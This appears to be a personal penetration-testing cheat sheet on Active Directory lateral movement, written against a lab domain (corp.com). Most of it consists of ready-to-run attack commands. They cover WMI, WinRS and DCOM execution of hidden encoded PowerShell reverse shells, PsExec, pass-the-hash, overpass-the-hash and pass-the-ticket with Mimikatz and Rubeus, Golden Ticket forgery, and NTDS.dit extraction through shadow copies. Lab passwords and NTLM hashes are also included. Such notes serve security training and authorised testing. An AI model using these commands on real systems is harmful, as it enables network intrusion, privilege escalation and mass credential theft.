

Plan :
- Understand WMI, WinRS, and WinRM Lateral Movement Techniques
- Abuse PsExec for Lateral Movement
- Learn about Pass The Hash and Overpass The Hash as Lateral Movement Techniques
- Misuse DCOM to Move Laterally



# Lateral Movement 

# ⚠️ WMI and WinRM
 [_Windows Management Instrumentation_](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), which is an object-oriented feature that facilitates task automation.


Create calc job as jen on FILE04

```
wmic /node:192.168.231.73 /user:jen /password:Nexus123! process call create "calc"
```

## ⚠️ WMI from Current session to adjacent Machine - Rev (Power)Shell
If we have credentials and we want to move laterally within the network by getting a reverse shell from an adjacent machine we can run the following after changing the IP address in the VICTIM_IP and out Powershell Command. We might need to try the machine name instead of the ip address.
Below we are effectively sending the variable : `$Session`, `$options` and `$Command` . Remeber to keep `powershell -nop -w hidden -e ` : (No profile and hidden window )

```
$username = 'USERNAME';
$password = 'PASSWORD';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName VICTIM_IP -Credential $credential -SessionOption $Options 
$command = 'powershell -nop -w hidden -e JABj.....<<<BASE64_BLOB>>>.....pAA==';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```


## ⚠️ WinRS - from Current session to adjacent Machine
```
winrs -r:MACHINE -u:USERNAME -p:PASSWORD "powershell -nop -w hidden -e JABj.....<<<BASE64_BLOB>>>.....pAA=="
```
Eg - `winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABj.....<<<BASE64_BLOB>>>.....pAA=="`


## ⚠️ Powershell Remoteing Lateral movement 
1. Create Your credentials and define the VICTIM_IP
```
$username = 'jen'; $password = 'Nexus123!'; $secureString = ConvertTo-SecureString $password -AsPlaintext -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $secureString; New-PSSession -ComputerName VICTIM_IP -Credential $credential; 
```
2. Enter into the session ( `assuming its session number 1`)
```
Enter-PSSession 1
```


## ⚠️ PSExec Within a domian 
3 prerequisites:
- The authenticating user  needs to be part of the Administrators local group to the target machine.
- The `ADMIN$` share must be available
- File and Printer Sharing has to be turned on.

```
.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```

```
.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```

From Local PSexec
```
impacket-psexec corp/jen:'Nexus123!'@192.168.231.73 
```

---

## ⚠️ Pass the Hash
Also 3 prerequisites:
- requires an SMB connection through the firewall (commonly port 445)
- The `ADMIN$` share must be available
- File and Printer Sharing has to be turned on.

Winrm , WMIexec could be used or Impacket etc

```
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

**Note:  Many tools allow Hashed based AuthN**

---

## ⚠️ Over-pass the Hash
The essence of Overpass-the-Hash is to **"overuse"** a hash: turn an NTLM hash into a Kerberos TGT, avoiding NTLM auth altogether. Once we have a Ticket we can `Pass the Ticket`

Key: You don’t need admin to request a TGT (Overpass). **Admin is only needed if** your method requires LSASS access (e.g., dumping keys, patching creds, or injecting into another user’s session). Injecting into your own session may not require admin. Therefore:

- **With admin** (Mimikatz): hash → LSASS → injected TGT → new PowerShell
- **Without admin** (Rubeus / Impacket) hash → KDC → TGT file → use with Kerberos tools

We have a users hash
```
369def79d8372408bf6e93364cc93075
```

##### If admin - use Mimikatz
```
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```
This will open powershell 


##### If non-Admin - Use Rubeus
```
Rubeus.exe asktgt /user:jen /rc4:369def79d8372408bf6e93364cc93075 /domain:corp.com /outfile:jen.kirbi
```

+ (You’ll need admin rights to inject into LSASS)

```
Rubeus.exe ptt /ticket:jen.kirbi
```
Now the ticket is active in memory — and you can run tools like `dir \\files04\c$,` `PsExec`, or `whoami /groups` (to test privilege).


( Note: Don't get confused — `whoami` shows your session user (the launcher), **NOT** the hash user. But you still inherit the victim’s privs. )

Check for existing tickets
```
klist
```

Hopefully there are none to start with

next try and AuthN to an adjacent server
```
net use \\files04
```

Run klist again and we should see a few new tickets.
- **TGT (krbtgt)** - `Ticket Granting Ticket` — a "proof" from the Domain Controller that you're a legit domain user. Not a privesc juts an identity validation. All userrs get one. This is what allows you to request TGSs.
- **CIFS Ticket (TGS)** - This is a `Ticket Granting Service ticket` — issued after the TGT, for a specific service, like `CIFS/FILES01.corp.com` - This gives you access.

These can now be used with other tools like `dir \\files04\c$,` `PsExec`, or `whoami /groups` (to test privilege).

```
.\PsExec.exe \\files04 cmd
```

Get a reverese shell 
```
.\PsExec.exe \\files04 "powershell -e JABjAG...<BASE64_BLOB>...ApAA=="
```

---


## ⚠️Pass the Ticket

The `Pass the Ticket` attack takes advantage of a **TGS** (service ticket), which can be exported from one host and **re-injected** elsewhere on the network, then used to authenticate to a specific service.

A `TGT` is not bound to a specific host and can usually be reused across systems during its lifetime (~10 hours), allowing you to request **new service tickets (TGS)** for multiple services.

In contrast:
- A `TGS` is issued for a **specific SPN** (like `CIFS/web04`)
- It is valid **only for that one service**
- ❌ It **cannot** be reused for other hosts or services

1. Verify we cannot access the resource
```
ls \\web04\backup
```

2. (Optional) Create a dir to store all the tickets
```
mkdir Tickets_Export; cd Tickets_Export
```
Open Mimimikatz as admin and dump all the tickets
```
privilege::debug
sekurlsa::tickets /export
```

exit and list all the tickets with names like : ` [0;11cc51]-0-0-40810000-dave@cifs-web04.kirbi`

Exit and reopen Mimikatz (or run new session), run privilege::debug again:
```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```


Confirm it is now loaded in memory

```
klist
```

Access the resouce
```
ls \\web04\backup
```

---
## ⚠️ DCOM – Lateral Movement

DCOM lateral movement from an adjacent machine by remotely instantiating an MMC 2.0 COM object (e.g., from PowerShell) and executing a command via `ExecuteShellCommand`.

**Transport**
- RPC Endpoint Mapper on **TCP 135**
- Then RPC typically uses **dynamic high ports** (unless the environment restricts them)
 
**Permissions**
- **Commonly requires local admin on the target** because remote DCOM _Launch/Activation_ permissions are often limited to Administrators by default.
- **Technically you only need DCOM permissions** for that COM server (Remote Launch + Remote Activation / DCOM access).
- This is handled by the **COM activation service (RPCSS / “COM SCM”)**, not the Windows _Service Control Manager_ (services).
    
**Example**
```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","VICTIM_IP")); $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABj.....<<BASE64_BLOB>>.....pAA==","7")
```

**Note**
- The final argument `"7"` is the **WindowState**; `7` = **minimized, not active** (SW_SHOWMINNOACTIVE).


## ⚠️ Golden Ticket

If we can get our hands on the **krbtgt password hash**, we could create our own self-made custom TGTs, aka `Golden Tickets`. When a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is the password hash of a domain user account called `krbtgt`.

Golden Tickets are forged TGTs that can be created if an attacker obtains the krbtgt account’s Kerberos key material (derived from its password — e.g., RC4/NTLM-derived key or AES keys, depending on domain settings). Domain Controllers use this key material to sign/protect TGTs, so a forged TGT can appear valid across the domain.

Get the NTLM hash of the `krbtgt` account
```
.\mimikatz.exe "privilege::debug" "lsadump::lsa /patch" "exit" > MimiGolden.txt
```
- `1693c6cefafffc7af11ef34d1c788f47`

Get the Domain `SID` . We can get this by running the below and then remove the rightmost 3/4 digit block.
```
whoami /user
```

Instead of useing `/rc4` we shall use `/krbtgt` like
```
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /groups:512 /ptt
```
- `/groups:512` = Domain Admins group
- `/ptt` = Pass-the-Ticket (inject into current session)


Inject the ticket into the memory of a cmd prompt
```
misc::cmd
```

You’ll now access the DC as jen, with Domain Admin privileges — despite jen not being in that group originally.

```
PsExec.exe \\dc1 cmd.exe
```

⚠️ **Important: Do NOT use IP address**. You will force NTLM authentication, and the Golden Ticket (which is Kerberos-based) won’t be used.
- 🚫 Access will be blocked
- ✅ Always use the hostname, not the IP

Note: Alternative Mimikatz if we are Domain admin and want persistance is to run : `lsadump::dcsync /user:krbtgt`


See [Hacker Recipie here](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden)

---

## ⚠️ Shadow Copies

Abuse the `vshadow` utility to create a *Shadow Copy* that will allow us to extract the Active Directory Database `NTDS.dit` database file. Once we've obtained a copy of the database, we need the `SYSTEM` hive, and then we can extract every user credential offline 

1. Launch an elevated command prompt and run the vshadow utility with `-nw` options to disable writers, which speeds up backup creation and include the `-p` option to store the copy on disk.

```
vshadow.exe -nw -p  C:
```

Output will contains somthing like 
```
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

2. Get the `ntds.dit` file and copy it to somewwhere like  `Windwos\Tasks` for transport
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\Windows\Tasks\ntds.dit.bak
```

3. Get the `SYSTEM` hive
```
reg.exe save hklm\system c:\Windows\Tasks\system.bak
```
4. Export locally and then run 
```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL | tee SecretsDump_AD.txt
```

More comprehensive
```
impacket-secretsdump -user-status -history -pwd-last-set -ntds ntds.dit.bak -system system.bak LOCAL | tee SecretsDump_AD.txt
```

---